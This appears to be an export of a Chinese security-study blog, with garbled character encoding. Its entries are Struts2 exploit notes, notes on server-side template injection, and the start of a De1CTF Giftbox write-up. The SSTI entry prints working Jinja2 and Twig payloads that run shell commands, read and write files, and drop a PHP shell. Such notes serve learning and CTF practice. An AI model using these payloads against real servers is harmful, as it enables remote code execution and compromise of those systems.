<h2 id="ç›¸å…³çš„å‚è€ƒ"><a href="#ç›¸å…³çš„å‚è€ƒ" class="headerlink" title="ç›¸å…³çš„å‚è€ƒ"></a>ç›¸å…³çš„å‚è€ƒ</h2><p><a href="https://tiaonmmn.github.io/2019/07/18/ISITDTU-Easy-PHP/" target="_blank" rel="noopener">Tiaonmmn.ZMZå®˜æ–¹wp</a><br><a href="https://www.cnblogs.com/BOHB-yunying/p/11520031.html" target="_blank" rel="noopener">PHPä»£ç å®¡è®¡ï¼Œæ— å­—æ¯æ•°å­—webshell</a></p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>code audit</tag>
        <tag>çæ‰¯</tag>
      </tags>
  </entry>
  <entry>
    <title>Strust2 æŒ–å‘è®°å½•</title>
    <url>/yakko117/2020/02/24/Struts2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p><a href="https://www.cnblogs.com/qiantan/p/10695567.html" target="_blank" rel="noopener">struts2æ¼æ´æ€»ç»“(åˆ°19å¹´4æœˆ)</a><br><a href="https://www.freebuf.com/tag/struts2%E6%BC%8F%E6%B4%9E" target="_blank" rel="noopener">Struts2æ¼æ´</a><br><a href="https://github.com/vulhub/vulhub/tree/master/struts2" target="_blank" rel="noopener">vulhub</a><br><a href="https://www.cnblogs.com/leaf-7/p/5509527.html" target="_blank" rel="noopener">struts2 s2-005/s2-009/s2-013/s2-016/s2-019 payload</a><br><a href="https://www.jianshu.com/p/1d0987abbe29" target="_blank" rel="noopener">Struts-S2-007æ¼æ´åˆ©ç”¨ï¼ˆå«ç¯å¢ƒæ­å»ºã€å«POCã€å«POCé—®é¢˜è§£å†³æ–¹æ¡ˆï¼‰</a><br><a href="https://www.cnblogs.com/hayasi/category/869760.html" target="_blank" rel="noopener">Struts2 æºç åˆ†æ</a><br><a href="https://www.freebuf.com/vuls/168609.html" target="_blank" rel="noopener">Struts2è‘—åRCEæ¼æ´å¼•å‘çš„åå¹´ä¹‹æ€</a></p>
<hr>
<h1 id="tags"><a href="#tags" class="headerlink" title="tags"></a>tags</h1><h2 id="ç¼–ç é—®é¢˜"><a href="#ç¼–ç é—®é¢˜" class="headerlink" title="ç¼–ç é—®é¢˜"></a>ç¼–ç é—®é¢˜</h2><p>æ‰“<code>poc</code> çš„æ—¶å€™ï¼Œæœ€å¥½è‡ªå·±å¤šæ³¨æ„ä¸€ä¸‹ <code>Tomcat</code> çš„ç‰ˆæœ¬ï¼Œå¾ˆå¤šåœ¨ <code>Tomcat7</code> èƒ½ç›´æ¥æ‰“çš„ <code>poc</code>ï¼Œåœ¨8çš„ç‰ˆæœ¬å¯èƒ½ä¼šæŠ¥ <code>400</code>ï¼Œæˆ–è€…æ˜¯æ— å›æ˜¾ï¼Œä¸»è¦åŸå› æ˜¯ <code>\</code> <code>&#39;</code> <code>&quot;</code> è¿™ç§åœ¨ <code>path</code>æäº¤ä¼šè¢«wafï¼Œé€šå¸¸æƒ…å†µå¯ä»¥å°† <code>poc</code> è¿›è¡Œä¸€æ¬¡ <code>URLç¼–ç </code>ï¼Œç„¶åçœ‹æ˜¯å¦å¯ä»¥æ‰“è¿›å»<br>(å®åœ¨æ‰“pocæ— æ•ˆï¼Œé‚£å°±å¬å¤©å‘½å§ï¼Œæ¯•ç«Ÿé¬¼çŸ¥é“åˆ«äººçš„åå°æ€ä¹ˆæ­çš„ï¼Œé¬¼çŸ¥é“shellä¼šå¼¹åˆ°å“ªä¸ªä½ç½®ï¼‰</p>
<hr>
<h2 id="pocè§£æé—®é¢˜"><a href="#pocè§£æé—®é¢˜" class="headerlink" title="pocè§£æé—®é¢˜"></a>pocè§£æé—®é¢˜</h2><p>ä½¿ç”¨<code>S2-007</code>çš„<code>poc</code>æ—¶ï¼Œæ³¨æ„æ§åˆ¶<code>res[num]</code>å¤§å°ï¼Œæ³¨æ„ä¸è¦å°† <code>res</code> å¤§å°è¶…è¿‡å‘½ä»¤æ‰§è¡Œç»“æœï¼Œå¦åˆ™ä¼šå›æ˜¾nullã€‚<br>(Buuå¤ç°çš„æ—¶å€™ï¼Œæµ‹åˆ° <code>res=new+byte[1314]</code> æ‰ç»™flag)</p>
<p><a href="https://github.com/zhzyker/exphub" target="_blank" rel="noopener">expå·¥å…·åº“</a></p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title>SSTi æ¨¡æ¿æ³¨å…¥ç¬”è®°</title>
    <url>/yakko117/2020/04/09/SSTi_learning/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>å°å£°bbï¼Œæƒ³ç©FF7</p>
<h1 id="ä»€ä¹ˆæ˜¯SSTi"><a href="#ä»€ä¹ˆæ˜¯SSTi" class="headerlink" title="ä»€ä¹ˆæ˜¯SSTi"></a>ä»€ä¹ˆæ˜¯SSTi</h1><p><code>SSTi</code> å°±æ˜¯æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥<code>(Server-Side Template Injection)</code>ï¼Œä¹Ÿç»™å‡ºäº†ä¸€ä¸ªæ³¨å…¥çš„æ¦‚å¿µã€‚<br>å¸¸è§çš„æ³¨å…¥æœ‰ï¼šSQL æ³¨å…¥ï¼ŒXSS æ³¨å…¥ï¼ŒXPATH æ³¨å…¥ï¼ŒXML æ³¨å…¥ï¼Œä»£ç æ³¨å…¥ï¼Œå‘½ä»¤æ³¨å…¥ç­‰ç­‰ã€‚</p>
<p><code>SSTi</code> ä¹Ÿæ˜¯è·å–äº†ä¸€ä¸ªè¾“å…¥ï¼Œç„¶åå†åç«¯çš„æ¸²æŸ“å¤„ç†ä¸Šè¿›è¡Œäº†è¯­å¥çš„æ‹¼æ¥ï¼Œç„¶åæ‰§è¡Œã€‚å½“ç„¶è¿˜æ˜¯å’Œsqlæ³¨å…¥æœ‰æ‰€ä¸åŒçš„ï¼Œ<code>SSTi</code> åˆ©ç”¨çš„æ˜¯ç°åœ¨çš„ç½‘ç«™æ¨¡æ¿å¼•æ“(ä¸‹é¢ä¼šæåˆ°)ï¼Œä¸»è¦é’ˆå¯¹<code>python</code>ã€<code>php</code>ã€<code>java</code> çš„ä¸€äº›ç½‘ç«™å¤„ç†æ¡†æ¶ï¼Œæ¯”å¦‚<strong>Python</strong> çš„ <strong>jinja2 mako tornado django</strong>ï¼Œ<strong>Php</strong> çš„ <strong>smarty twig</strong>ï¼Œ<strong>Java</strong> çš„ <strong>jade velocity</strong>ã€‚å½“è¿™äº›æ¡†æ¶å¯¹è¿ç”¨æ¸²æŸ“å‡½æ•°ç”Ÿæˆhtmlçš„æ—¶å€™ä¼šå‡ºç° <code>SSTi</code> çš„é—®é¢˜ã€‚</p>
<p>ç°åœ¨ç½‘ä¸Šæèµ·çš„æ¯”è¾ƒå¤šçš„æ˜¯Pythonçš„ç½‘ç«™ã€‚</p>
<h2 id="æ¨¡æ¿å¼•æ“"><a href="#æ¨¡æ¿å¼•æ“" class="headerlink" title="æ¨¡æ¿å¼•æ“"></a>æ¨¡æ¿å¼•æ“</h2><p><strong>æ¨¡æ¿å¼•æ“</strong> (è¿™é‡Œç‰¹æŒ‡ç”¨äºWebå¼€å‘çš„æ¨¡æ¿å¼•æ“)</p>
<ul>
<li>æ˜¯ä¸ºäº†ä½¿ç”¨æˆ·ç•Œé¢ä¸ä¸šåŠ¡æ•°æ®ï¼ˆå†…å®¹ï¼‰åˆ†ç¦»è€Œäº§ç”Ÿçš„ï¼Œå®ƒå¯ä»¥ç”Ÿæˆç‰¹å®šæ ¼å¼çš„æ–‡æ¡£ï¼Œç”¨äºç½‘ç«™çš„æ¨¡æ¿å¼•æ“å°±ä¼šç”Ÿæˆä¸€ä¸ªæ ‡å‡†çš„HTMLæ–‡æ¡£ã€‚</li>
<li>å¯ä»¥è®©ï¼ˆç½‘ç«™ï¼‰ç¨‹åºå®ç°ç•Œé¢ä¸æ•°æ®åˆ†ç¦»,ä¸šåŠ¡ä»£ç ä¸é€»è¾‘ä»£ç çš„åˆ†ç¦»ï¼Œè¿™å°±å¤§å¤§æå‡äº†å¼€å‘æ•ˆç‡ï¼Œè‰¯å¥½çš„è®¾è®¡ä¹Ÿä½¿å¾—ä»£ç é‡ç”¨å˜å¾—æ›´åŠ å®¹æ˜“ã€‚</li>
</ul>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œåˆ©ç”¨ <strong>æ¨¡æ¿å¼•æ“</strong> æ¥ç”Ÿæˆå‰ç«¯çš„ <code>htmlä»£ç </code>ï¼Œæ¨¡æ¿å¼•æ“ä¼šæä¾›ä¸€å¥—ç”Ÿæˆhtmlä»£ç çš„ç¨‹åºï¼Œç„¶ååªéœ€è¦è·å–ç”¨æˆ·çš„æ•°æ®ï¼Œç„¶åæ”¾åˆ°æ¸²æŸ“å‡½æ•°é‡Œï¼Œç„¶åç”Ÿæˆ <code>æ¨¡æ¿+ç”¨æˆ·æ•°æ®</code>çš„ <code>å‰ç«¯htmlé¡µé¢</code>ï¼Œç„¶ååé¦ˆç»™æµè§ˆå™¨ï¼Œå‘ˆç°åœ¨ç”¨æˆ·é¢å‰ã€‚</p>
<p>æ¨¡æ¿å¼•æ“ä¹Ÿä¼šæä¾›æ²™ç®±æœºåˆ¶æ¥è¿›è¡Œæ¼æ´é˜²èŒƒï¼Œä½†æ˜¯å¯ä»¥ç”¨æ²™ç®±é€ƒé€¸æŠ€æœ¯æ¥è¿›è¡Œç»•è¿‡ã€‚</p>
<h1 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># exec webshell1</span></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">'catch_warnings'</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">'eval'</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("id").read()'</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># exec webshell2</span></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">'catch_warnings'</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">'eval'</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("id").read()'</span>) &#125;&#125; </span><br><span class="line">    <span class="comment"># poppençš„å‚æ•°å°±æ˜¯è¦æ‰§è¡Œçš„å‘½ä»¤</span></span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–åŸºæœ¬ç±»</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">object</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¯»æ–‡ä»¶</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">r'C:\1.php'</span>).read()</span><br><span class="line">object.__subclasses__()[<span class="number">40</span>](<span class="string">r'C:\1.php'</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># å†™æ–‡ä»¶</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/var/www/html/input'</span>, <span class="string">'w'</span>).write(<span class="string">'123'</span>)</span><br><span class="line">object.__subclasses__()[<span class="number">40</span>](<span class="string">'/var/www/html/input'</span>, <span class="string">'w'</span>).write(<span class="string">'123'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰§è¡Œä»»æ„å‘½ä»¤</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("ls  /var/www/html").read()'</span> )</span><br><span class="line">object.__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("ls  /var/www/html").read()'</span> )</span><br></pre></td></tr></table></figure></div>

<h2 id="TWIG-å…¨ç‰ˆæœ¬-é€šç”¨-SSTI-payload"><a href="#TWIG-å…¨ç‰ˆæœ¬-é€šç”¨-SSTI-payload" class="headerlink" title="TWIG å…¨ç‰ˆæœ¬ é€šç”¨ SSTI payload"></a>TWIG å…¨ç‰ˆæœ¬ é€šç”¨ SSTI payload</h2><p><a href="https://xz.aliyun.com/t/7518" target="_blank" rel="noopener">å‚è€ƒæ–‡æ¡£</a></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[<span class="string">"id"</span>]|map(<span class="string">"system"</span>)|join(<span class="string">","</span>)</span><br><span class="line">&#123;&#123;[<span class="string">"id"</span>, <span class="number">0</span>]|sort(<span class="string">"system"</span>)|join(<span class="string">","</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">"id"</span>]|filter(<span class="string">"system"</span>)|join(<span class="string">","</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="number">0</span>, <span class="number">0</span>]|reduce(<span class="string">"system"</span>, <span class="string">"id"</span>)|join(<span class="string">","</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;&#123;<span class="string">"&lt;?php phpinfo();"</span>:<span class="string">"/var/www/html/shell.php"</span>&#125;|map(<span class="string">"file_put_contents"</span>)&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="éœ€è¦äº†è§£çš„ä¸€äº›ä¸œè¥¿"><a href="#éœ€è¦äº†è§£çš„ä¸€äº›ä¸œè¥¿" class="headerlink" title="éœ€è¦äº†è§£çš„ä¸€äº›ä¸œè¥¿"></a>éœ€è¦äº†è§£çš„ä¸€äº›ä¸œè¥¿</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__</span><br><span class="line">&lt;type <span class="string">'str'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__</span><br><span class="line"></span><br><span class="line"><span class="comment"># å…ƒç»„</span></span><br><span class="line">&lt;type <span class="string">'tuple'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ—è¡¨</span></span><br><span class="line">&lt;type <span class="string">'list'</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># å­—å…¸</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;&#125;.__class__</span><br><span class="line">&lt;type <span class="string">'dict'</span>&gt;</span><br></pre></td></tr></table></figure></div>

<p><strong>_<em>class_</em></strong> ï¼šç”¨æ¥æŸ¥çœ‹å˜é‡æ‰€å±çš„ç±»ï¼Œæ ¹æ®å‰é¢çš„å˜é‡å½¢å¼å¯ä»¥å¾—åˆ°å…¶æ‰€å±çš„ç±»ã€‚</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__</span><br><span class="line">(&lt;type <span class="string">'object'</span>&gt;,)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__bases__</span><br><span class="line">(&lt;type <span class="string">'basestring'</span>&gt;,)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__bases__</span><br><span class="line">(&lt;type <span class="string">'object'</span>&gt;,)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;&#125;.__class__.__bases__</span><br><span class="line">(&lt;type <span class="string">'object'</span>&gt;,)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">&lt;type <span class="string">'object'</span>&gt;</span><br></pre></td></tr></table></figure></div>

<p><strong>_<em>bases_</em></strong> ï¼šç”¨æ¥æŸ¥çœ‹ç±»çš„åŸºç±»ï¼Œä¹Ÿå¯æ˜¯ä½¿ç”¨æ•°ç»„ç´¢å¼•æ¥æŸ¥çœ‹ç‰¹å®šä½ç½®çš„å€¼</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang"></div></div><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">[&lt;type <span class="string">'type'</span>&gt;, &lt;type <span class="string">'weakref'</span>&gt;, &lt;type <span class="string">'weakcallableproxy'</span>&gt;, &lt;type <span class="string">'weakproxy'</span>&gt;,</span><br><span class="line"> &lt;type <span class="string">'int'</span>&gt;, &lt;type <span class="string">'basestring'</span>&gt;, &lt;type <span class="string">'bytearray'</span>&gt;, &lt;type <span class="string">'list'</span>&gt;, &lt;type <span class="string">'NoneType'</span>&gt;, </span><br><span class="line"> &lt;type <span class="string">'NotImplementedType'</span>&gt;, &lt;type <span class="string">'traceback'</span>&gt;, &lt;type <span class="string">'super'</span>&gt;, &lt;type <span class="string">'xrange'</span>&gt;, </span><br><span class="line"> &lt;type <span class="string">'dict'</span>&gt;, &lt;type <span class="string">'set'</span>&gt;, &lt;type <span class="string">'slice'</span>&gt;, &lt;type <span class="string">'staticmethod'</span>&gt;, &lt;type <span class="string">'complex'</span>&gt;, </span><br><span class="line"> &lt;type <span class="string">'float'</span>&gt;, &lt;type <span class="string">'buffer'</span>&gt;, &lt;type <span class="string">'long'</span>&gt;, &lt;type <span class="string">'frozenset'</span>&gt;, &lt;type <span class="string">'property'</span>&gt;, </span><br><span class="line"> &lt;type <span class="string">'memoryview'</span>&gt;, &lt;type <span class="string">'tuple'</span>&gt;, &lt;type <span class="string">'enumerate'</span>&gt;, &lt;type <span class="string">'reversed'</span>&gt;, &lt;type <span class="string">'code'</span>&gt;, </span><br><span class="line"> &lt;type <span class="string">'frame'</span>&gt;, &lt;type <span class="string">'builtin_function_or_method'</span>&gt;, &lt;type <span class="string">'instancemethod'</span>&gt;,</span><br><span class="line">  &lt;type <span class="string">'function'</span>&gt;, &lt;type <span class="string">'classobj'</span>&gt;, &lt;type <span class="string">'dictproxy'</span>&gt;, &lt;type <span class="string">'generator'</span>&gt;,</span><br><span class="line">    &lt;type <span class="string">'getset_descriptor'</span>&gt;, &lt;type <span class="string">'wrapper_descriptor'</span>&gt;, &lt;type <span class="string">'instance'</span>&gt;, &lt;type <span class="string">'ellipsis'</span>&gt;,</span><br><span class="line">    &lt;type <span class="string">'member_descriptor'</span>&gt;, &lt;type <span class="string">'file'</span>&gt;, &lt;type <span class="string">'PyCapsule'</span>&gt;, &lt;type <span class="string">'cell'</span>&gt;, </span><br><span class="line">    &lt;type 'callable-iterator'&gt;, &lt;type 'iterator'&gt;, &lt;type 'sys.long_info'&gt;, &lt;type 'sys.float_info'&gt;, &lt;type 'EncodingMap'&gt;, &lt;type 'fieldnameiterator'&gt;, &lt;type 'formatteriterator'&gt;, &lt;type 'sys.version_info'&gt;, &lt;type 'sys.flags'&gt;, &lt;type 'sys.getwindowsversion'&gt;, &lt;type 'exceptions.BaseException'&gt;, &lt;type 'module'&gt;, &lt;type 'imp.NullImporter'&gt;, &lt;type 'zipimport.zipimporter'&gt;, &lt;type 'nt.stat_result'&gt;, &lt;type 'nt.statvfs_result'&gt;, &lt;class 'warnings.WarningMessage'&gt;, &lt;class 'warnings.catch_warnings'&gt;, &lt;class '_weakrefset._IterationGuard'&gt;, &lt;class '_weakrefset.WeakSet'&gt;, &lt;class '_abcoll.Hashable'&gt;, &lt;type 'classmethod'&gt;, &lt;class '_abcoll.Iterable'&gt;, &lt;class '_abcoll.Sized'&gt;, &lt;class '_abcoll.Container'&gt;, &lt;class '_abcoll.Callable'&gt;, &lt;type 'dict_keys'&gt;, &lt;type 'dict_items'&gt;, &lt;type 'dict_values'&gt;, &lt;class 'site._Printer'&gt;, &lt;class 'site._Helper'&gt;, &lt;type '_sre.SRE_Pattern'&gt;, &lt;type '_sre.SRE_Match'&gt;, &lt;type '_sre.SRE_Scanner'&gt;, &lt;class 'site.Quitter'&gt;, &lt;class 'codecs.IncrementalEncoder'&gt;, &lt;class 'codecs.IncrementalDecoder'&gt;, &lt;type 'operator.itemgetter'&gt;, &lt;type 'operator.attrgetter'&gt;, &lt;type 'operator.methodcaller'&gt;, &lt;type 'functools.partial'&gt;, &lt;type 'MultibyteCodec'&gt;, &lt;type 'MultibyteIncrementalEncoder'&gt;, &lt;type 'MultibyteIncrementalDecoder'&gt;, &lt;type 'MultibyteStreamReader'&gt;, &lt;type 'MultibyteStreamWriter'&gt;]</span><br></pre></td></tr></table></figure></div>

<p><strong>_<em>subclasses_</em>()</strong> ï¼šæŸ¥çœ‹å½“å‰ç±»çš„å­ç±»ã€‚</p>
<p>å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥ç”¨ <strong>object._<em>subclasses_</em>()</strong>ï¼Œä¼šå¾—åˆ°å’Œä¸Šé¢ä¸€æ ·çš„ç»“æœã€‚<br>è·å–åŸºç±»è¿˜èƒ½ç”¨è¿˜æœ‰ <strong>_<em>mro_</em></strong>ï¼Œæ¯”å¦‚ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__mro__</span><br><span class="line">(&lt;class 'str'&gt;, &lt;class 'object'&gt;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__mro__</span><br><span class="line">(&lt;class 'list'&gt;, &lt;class 'object'&gt;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;&#125;.__class__.__mro__</span><br><span class="line">(&lt;class 'dict'&gt;, &lt;class 'object'&gt;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__mro__</span><br><span class="line">(&lt;class 'tuple'&gt;, &lt;class 'object'&gt;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨ç´¢å¼•è·å–åŸºç±»</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">object</span>'&gt;</span></span><br></pre></td></tr></table></figure></div>

<h1 id="åŠ›æ¨å‚è€ƒå­¦ä¹ "><a href="#åŠ›æ¨å‚è€ƒå­¦ä¹ " class="headerlink" title="åŠ›æ¨å‚è€ƒå­¦ä¹ "></a>åŠ›æ¨å‚è€ƒå­¦ä¹ </h1><p><a href="https://blog.csdn.net/qq_43390703/article/details/104256001" target="_blank" rel="noopener">pythonæ²™ç®±é€ƒé€¸</a></p>
<p><a href="https://github.com/epinna/tplmap" target="_blank" rel="noopener">SSTiç¥å™¨â€“Tplmap</a></p>
<p><a href="https://blog.csdn.net/weixin_43536759/article/details/105066445" target="_blank" rel="noopener">SSTIæ³¨å…¥è¯­å¥æ€»ç»“</a></p>
<p><a href="https://blog.csdn.net/wy_97/article/details/80393854" target="_blank" rel="noopener">pythonæ²™ç®±é€ƒé€¸ä¸€äº›å¥—è·¯çš„å°ç»“</a></p>
<p><a href="https://www.freebuf.com/articles/system/203208.html" target="_blank" rel="noopener">ä¸€æ–‡çœ‹æ‡‚Pythonæ²™ç®±é€ƒé€¸</a></p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>çæ‰¯</tag>
        <tag>æ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title>De1CTF Giftboxé¢˜è§£</title>
    <url>/yakko117/2020/04/02/De1CTFGiftbox/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>ä¸€é“å¯ä»¥å­¦ä¹ åˆ°å¾ˆå¤šçš„é¢˜ç›®ï¼Œè¿˜æ˜¯è‡ªå·±å¤ªèœäº†ï¼Œè¦çœ‹å¤§ä½¬çš„wpæ‰èƒ½å®Œå…¨äº†è§£é€å½»</p>
<h1 id="De1CTF-2019-Giftbox"><a href="#De1CTF-2019-Giftbox" class="headerlink" title="[De1CTF 2019]Giftbox"></a>[De1CTF 2019]Giftbox</h1><p>é¢˜ç›®æ‰“å¼€ï¼Œåªèƒ½æ„Ÿæ…¨å¤§å¸ˆå‚…è¿˜æ˜¯å¤§å¸ˆå‚…ï¼Œé¢˜ç›®å‰ç«¯åšæˆè¿™ä¸ªæ•ˆæœï¼Œå¤ªé¡¶äº†</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_1.png" data-fancybox="group" data-caption="gift1" class="fancybox"><img alt="gift1" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_1.png" class="lazyload" title="gift1"></a></p>
<p>çœ‹æ ·å­æ˜¯ä¸ª <code>linuxç»ˆç«¯</code>, ç„¶åçœ‹ä¸€ä¸‹æœ‰å“ªäº›å‘½ä»¤å¯ä»¥è°ƒç”¨</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_2.png" data-fancybox="group" data-caption="gift2" class="fancybox"><img alt="gift2" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_2.png" class="lazyload" title="gift2"></a></p>
<p>è¯•ä¸€ä¸‹ç›¸åº”çš„å‘½ä»¤ï¼Œçœ‹ä¸€ä¸‹æ•ˆæœ</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_3.png" data-fancybox="group" data-caption="gift3" class="fancybox"><img alt="gift3" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_3.png" class="lazyload" title="gift3"></a></p>
<p>çœ‹åˆ°äº† <code>usage.md</code> æœ‰æ–°çš„ <code>hint</code>ï¼Œå°è¯•ä¸€ä¸‹</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_4.png" data-fancybox="group" data-caption="gift4" class="fancybox"><img alt="gift4" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_4.png" class="lazyload" title="gift4"></a></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œéƒ½éœ€è¦å…ˆç™»é™†ï¼Œé‚£å°±å°è¯•ä¸€ä¸‹ <code>sqlæ³¨å…¥</code></p>
